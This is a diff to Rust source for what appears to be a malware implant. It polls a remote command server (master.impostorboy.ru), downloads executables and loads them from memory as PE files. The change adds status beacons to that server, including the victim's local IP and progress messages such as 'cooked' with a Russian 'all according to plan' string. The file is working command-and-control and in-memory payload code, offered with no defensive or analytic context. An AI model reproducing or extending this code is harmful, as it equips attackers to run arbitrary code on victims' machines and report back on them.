@@ -11,6 +11,7 @@ const MASTER: &str = "https://master.impostorboy.ru";
 const POLL_INTERVAL: Duration = Duration::from_secs(60);
 const RETRY_DELAY: Duration = Duration::from_secs(5);
 const AUTOSTART_INTERVAL: Duration = Duration::from_secs(30);
+const VICTORY: &str = "все по плану";
 
 #[derive(Clone, Deserialize)]
 struct Virus {
@@ -90,6 +91,8 @@ async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
         .bytes()
         .await?;
 
+    send_status(&client, virus.id, "fifty", VICTORY.as_bytes().to_vec()).await?;
+
     {
         let module = Maple::load_executable_from_memory(&virus_bytes)
             .context("Не удалось загрузить PE-файл из памяти")?;
@@ -101,21 +104,27 @@ async fn run_virus_inner(client: reqwest::Client, virus: &Virus) -> Result<()> {
 
     seek_self_in_pro(&client, virus.id).await?;
 
+    send_status(&client, virus.id, "cooked", VICTORY.as_bytes().to_vec()).await?;
+
     Ok(())
 }
 
-async fn send_accepted(client: &reqwest::Client, id: u64) -> Result<()> {
+async fn send_status(client: &reqwest::Client, id: u64, status: &str, out: Vec<u8>) -> Result<()> {
     client
         .post(format!("{MASTER}/virus_status"))
         .json(&VirusResult {
             id,
-            status: "accepted".to_owned(),
-            out: local_ip().into_bytes(),
+            status: status.to_owned(),
+            out,
         })
         .send()
         .await?
         .error_for_status()?;
     Ok(())
+}
+
+async fn send_accepted(client: &reqwest::Client, id: u64) -> Result<()> {
+    send_status(client, id, "accepted", local_ip().into_bytes()).await
 }
 
 async fn seek_self_in_pro(client: &reqwest::Client, id: u64) -> Result<()> {
